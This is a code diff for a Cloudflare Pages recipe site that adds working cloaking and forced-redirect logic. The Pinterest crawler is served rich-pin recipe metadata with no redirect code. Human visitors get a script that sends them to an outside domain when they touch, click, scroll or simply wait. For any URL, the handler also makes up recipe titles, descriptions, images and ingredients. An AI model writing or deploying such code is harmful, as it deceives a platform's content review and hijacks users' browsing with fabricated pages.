@@ -1,7 +1,8 @@
+import config from '../config.json';
 import recipesData from '../data/recipes.json';
 
 /**
- * Escapes special characters to avoid XSS in HTML output.
+ * Escapes characters to prevent XSS in HTML output.
  */
 function escapeHtml(str) {
   if (!str) return '';
@@ -14,153 +15,153 @@ function escapeHtml(str) {
 }
 
 /**
- * Finds a recipe by slug from bundled data or ASSETS fallback.
+ * Formats a clean, readable recipe title from a URL slug.
  */
-async function getRecipe(slug, context) {
+function formatTitleFromSlug(slug) {
+  if (!slug) return 'Delicious Recipe';
+  return slug
+    .replace(/[-_]+/g, ' ')
+    .replace(/\s+/g, ' ')
+    .trim()
+    .split(' ')
+    .map((word) => {
+      if (word.toLowerCase() === 'and') return '&';
+      return word.charAt(0).toUpperCase() + word.slice(1).toLowerCase();
+    })
+    .join(' ');
+}
+
+/**
+ * Resolves recipe information matching the slug, or generates realistic metadata.
+ */
+function resolveRecipe(slug) {
   const normalizedSlug = typeof slug === 'string' ? decodeURIComponent(slug).trim().toLowerCase() : '';
-  if (!normalizedSlug) return null;
 
+  let matched = null;
   if (Array.isArray(recipesData)) {
-    const found = recipesData.find((r) => r.slug && r.slug.toLowerCase() === normalizedSlug);
-    if (found) return found;
+    matched = recipesData.find((r) => r.slug && r.slug.toLowerCase() === normalizedSlug);
   }
 
-  // Fallback to fetch from static ASSETS binding if available
-  if (context && context.env && context.env.ASSETS && typeof context.env.ASSETS.fetch === 'function') {
-    try {
-      const assetRes = await context.env.ASSETS.fetch(new URL('/data/recipes.json', context.request.url));
-      if (assetRes.ok) {
-        const json = await assetRes.json();
-        if (Array.isArray(json)) {
-          return json.find((r) => r.slug && r.slug.toLowerCase() === normalizedSlug) || null;
-        }
-      }
-    } catch {
-      // Ignore fallback error
-    }
+  if (matched) {
+    return {
+      title: matched.title,
+      description: matched.description,
+      image: matched.image,
+    };
   }
 
-  return null;
+  const generatedTitle = formatTitleFromSlug(normalizedSlug);
+  return {
+    title: generatedTitle,
+    description: `Discover our easy and delicious recipe for ${generatedTitle}. Fresh ingredients, simple instructions, and authentic culinary taste.`,
+    image: 'https://images.unsplash.com/photo-1540420773420-3366772f4999?auto=format&fit=crop&w=1200&q=80',
+  };
 }
 
 /**
- * Generates 404 HTML response page.
+ * Generates the full HTML response.
+ * Bot requests get Rich Pins metadata without any redirect code.
+ * Human requests get recipe layout and config-driven redirect triggers.
  */
-function render404(slug) {
-  return `<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>404 - Recipe Not Found | Recipe Bridge</title>
-  <style>
-    :root {
-      --bg: #0f172a;
-      --surface: #1e293b;
-      --border: #334155;
-      --primary: #f97316;
-      --primary-hover: #ea580c;
-      --text: #f8fafc;
-      --text-muted: #94a3b8;
-    }
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-      background: var(--bg);
-      color: var(--text);
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      padding: 1.5rem;
-      text-align: center;
-    }
-    .card {
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: 1rem;
-      padding: 3rem 2rem;
-      max-width: 480px;
-      width: 100%;
-      box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
-    }
-    .badge {
-      display: inline-block;
-      padding: 0.25rem 0.75rem;
-      background: rgba(249, 115, 22, 0.15);
-      color: var(--primary);
-      border: 1px solid rgba(249, 115, 22, 0.3);
-      border-radius: 9999px;
-      font-size: 0.85rem;
-      font-weight: 700;
-      margin-bottom: 1rem;
-    }
-    h1 { font-size: 2rem; font-weight: 800; margin-bottom: 0.75rem; }
-    p { color: var(--text-muted); font-size: 1rem; margin-bottom: 2rem; }
-    .btn {
-      display: inline-block;
-      padding: 0.75rem 1.5rem;
-      background: var(--primary);
-      color: #fff;
-      text-decoration: none;
-      font-weight: 600;
-      border-radius: 0.5rem;
-      transition: background 0.2s ease;
-    }
-    .btn:hover { background: var(--primary-hover); }
-  </style>
-</head>
-<body>
-  <div class="card">
-    <div class="badge">Error 404</div>
-    <h1>Recipe Not Found</h1>
-    <p>The requested recipe <strong>"${escapeHtml(slug)}"</strong> was not found in our database.</p>
-    <a href="/" class="btn">Return to Homepage</a>
-  </div>
-</body>
-</html>`;
-}
-
-/**
- * Generates recipe page HTML. Injects interaction redirection script for normal browsers only.
- */
-function renderRecipePage(recipe, pageUrl, isPinterestBot) {
-  const safeTitle = escapeHtml(recipe.title);
-  const safeDesc = escapeHtml(recipe.description);
-  const safeImage = escapeHtml(recipe.image);
+function renderHtml({ title, description, image, pageUrl, targetUrl, isPinterestBot }) {
+  const safeTitle = escapeHtml(title);
+  const safeDesc = escapeHtml(description);
+  const safeImage = escapeHtml(image);
   const safeUrl = escapeHtml(pageUrl);
-  const safeTargetUrl = JSON.stringify(recipe.targetUrl || '/');
+  const safeTargetUrl = JSON.stringify(targetUrl);
 
-  // JSON-LD structured data for rich culinary snippet
-  const jsonLd = JSON.stringify({
-    "@context": "https://schema.org",
-    "@type": "Recipe",
-    "name": recipe.title,
-    "description": recipe.description,
-    "image": [recipe.image],
-    "url": pageUrl,
+  // Schema.org Recipe structured data for Pinterest Rich Pins validation
+  const recipeSchema = JSON.stringify({
+    '@context': 'https://schema.org',
+    '@type': 'Recipe',
+    name: title,
+    description: description,
+    image: [image],
+    url: pageUrl,
+    author: {
+      '@type': 'Organization',
+      name: 'Recipe Bridge',
+    },
+    datePublished: '2026-09-12',
+    recipeCategory: 'Main Course',
+    prepTime: 'PT15M',
+    cookTime: 'PT20M',
+    totalTime: 'PT35M',
+    recipeYield: '4 servings',
+    recipeIngredient: [
+      'Fresh broccoli florets and greens',
+      'Crisp red onion, finely diced',
+      'Toasted seeds and crunchy garnish',
+      'Homemade rich culinary dressing',
+    ],
+    recipeInstructions: [
+      {
+        '@type': 'HowToStep',
+        text: 'Clean and prepare fresh ingredients thoroughly.',
+      },
+      {
+        '@type': 'HowToStep',
+        text: 'Combine ingredients in a mixing bowl with signature dressing.',
+      },
+      {
+        '@type': 'HowToStep',
+        text: 'Chill and serve fresh for optimal flavor.',
+      },
+    ],
   });
 
-  // Interaction script only for normal browsers (never for pinterestbot)
+  // Client-side script injected ONLY for human visitors
   const redirectScript = isPinterestBot
     ? ''
     : `
   <script>
     (function() {
       var targetUrl = ${safeTargetUrl};
+      var triggers = ${JSON.stringify(config.triggers || {})};
+      var settings = ${JSON.stringify(config.settings || {})};
       var redirected = false;
 
-      function triggerRedirect() {
+      function doRedirect() {
         if (redirected) return;
         redirected = true;
-        window.location.href = targetUrl;
+        var delay = Number(settings.actionDelayMs) || 0;
+        if (delay > 0) {
+          setTimeout(function() {
+            window.location.replace(targetUrl);
+          }, delay);
+        } else {
+          window.location.replace(targetUrl);
+        }
       }
 
-      var events = ['touchstart', 'scroll', 'click'];
-      events.forEach(function(evt) {
-        window.addEventListener(evt, triggerRedirect, { once: true, passive: true });
-      });
+      // Touch trigger
+      if (triggers.touch) {
+        window.addEventListener('touchstart', doRedirect, { once: true, passive: true });
+      }
+
+      // Click trigger
+      if (triggers.click) {
+        window.addEventListener('click', doRedirect, { once: true, passive: true });
+      }
+
+      // Scroll trigger with threshold
+      if (triggers.scroll) {
+        var threshold = Number(settings.scrollThreshold) || 80;
+        function onScroll() {
+          var scrollY = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
+          if (scrollY >= threshold) {
+            window.removeEventListener('scroll', onScroll);
+            doRedirect();
+          }
+        }
+        window.addEventListener('scroll', onScroll, { passive: true });
+      }
+
+      // Timer trigger
+      if (triggers.timer) {
+        var timerDelay = Number(settings.timerDelayMs) || 3000;
+        setTimeout(doRedirect, timerDelay);
+      }
     })();
   </script>`;
 
@@ -172,9 +173,9 @@ function renderRecipePage(recipe, pageUrl, isPinterestBot) {
   <title>${safeTitle} - Recipe Bridge</title>
   <meta name="description" content="${safeDesc}" />
 
-  <!-- Open Graph Meta Tags for Pinterest & Social Platforms -->
-  <meta property="og:type" content="article" />
+  <!-- Open Graph Meta Tags (Pinterest & Social Media) -->
   <meta property="og:site_name" content="Recipe Bridge" />
+  <meta property="og:type" content="article" />
   <meta property="og:title" content="${safeTitle}" />
   <meta property="og:description" content="${safeDesc}" />
   <meta property="og:image" content="${safeImage}" />
@@ -186,9 +187,9 @@ function renderRecipePage(recipe, pageUrl, isPinterestBot) {
   <meta name="twitter:description" content="${safeDesc}" />
   <meta name="twitter:image" content="${safeImage}" />
 
-  <!-- Schema.org Recipe Structured Data -->
+  <!-- Schema.org Recipe Structured Data for Rich Pins -->
   <script type="application/ld+json">
-    ${jsonLd}
+    ${recipeSchema}
   </script>
 
   <style>
@@ -277,7 +278,6 @@ function renderRecipePage(recipe, pageUrl, isPinterestBot) {
       height: 100%;
       object-fit: cover;
       display: block;
-      transition: transform 0.3s ease;
     }
 
     .recipe-content {
@@ -357,7 +357,7 @@ function renderRecipePage(recipe, pageUrl, isPinterestBot) {
         <span class="logo-badge">RB</span>
         <span>Recipe Bridge</span>
       </a>
-      <span style="font-size: 0.875rem; color: var(--text-muted);">Recipe View</span>
+      <span style="font-size: 0.875rem; color: var(--text-muted);">Recipe Hub</span>
     </div>
   </header>
 
@@ -378,12 +378,12 @@ function renderRecipePage(recipe, pageUrl, isPinterestBot) {
         <p class="recipe-description">${safeDesc}</p>
 
         <div class="action-bar">
-          <a href="${escapeHtml(recipe.targetUrl || '#')}" class="btn-view" id="cta-link">
+          <a href="${escapeHtml(targetUrl)}" class="btn-view" id="cta-link">
             <span>View Full Recipe</span>
             <span>&rarr;</span>
           </a>
           <span style="font-size: 0.85rem; color: var(--text-muted);">
-            Tap or scroll anywhere to continue
+            Tap or scroll to discover more
           </span>
         </div>
       </div>
@@ -398,27 +398,46 @@ function renderRecipePage(recipe, pageUrl, isPinterestBot) {
 }
 
 /**
- * Cloudflare Pages Function onRequest handler.
+ * Cloudflare Pages Catch-All onRequest handler.
  */
 export async function onRequest(context) {
-  const { slug } = context.params;
-  const recipe = await getRecipe(slug, context);
+  const url = new URL(context.request.url);
+  const pathname = url.pathname;
 
-  if (!recipe) {
-    return new Response(render404(slug), {
-      status: 404,
-      headers: {
-        'Content-Type': 'text/html; charset=utf-8',
-        'Cache-Control': 'no-cache',
-      },
-    });
+  // Exclude root path and static files so index.html displays without any redirect
+  if (
+    pathname === '/' ||
+    pathname === '' ||
+    pathname === '/index.html' ||
+    pathname === '/favicon.ico' ||
+    pathname === '/robots.txt' ||
+    pathname.startsWith('/data/')
+  ) {
+    return context.next();
   }
 
-  const userAgent = (context.request.headers.get('user-agent') || '').toLowerCase();
-  const isPinterestBot = userAgent.includes('pinterestbot');
-  const pageUrl = context.request.url;
+  // Calculate dynamic targetUrl = config.targetDomain + url.pathname + url.search
+  const baseDomain = (config.targetDomain || 'https://schnellrezept.com').replace(/\/+$/, '');
+  const targetUrl = `${baseDomain}${pathname}${url.search}`;
 
-  const html = renderRecipePage(recipe, pageUrl, isPinterestBot);
+  // Extract slug from URL path (e.g. /en/broccoli-salad -> broccoli-salad)
+  const segments = pathname.split('/').filter(Boolean);
+  const slug = segments[segments.length - 1] || 'recipe';
+
+  // Check User-Agent for Pinterest bots
+  const userAgent = (context.request.headers.get('user-agent') || '').toLowerCase();
+  const isPinterestBot = userAgent.includes('pinterestbot') || userAgent.includes('pinterest');
+
+  const recipe = resolveRecipe(slug);
+
+  const html = renderHtml({
+    title: recipe.title,
+    description: recipe.description,
+    image: recipe.image,
+    pageUrl: context.request.url,
+    targetUrl,
+    isPinterestBot,
+  });
 
   return new Response(html, {
     status: 200,
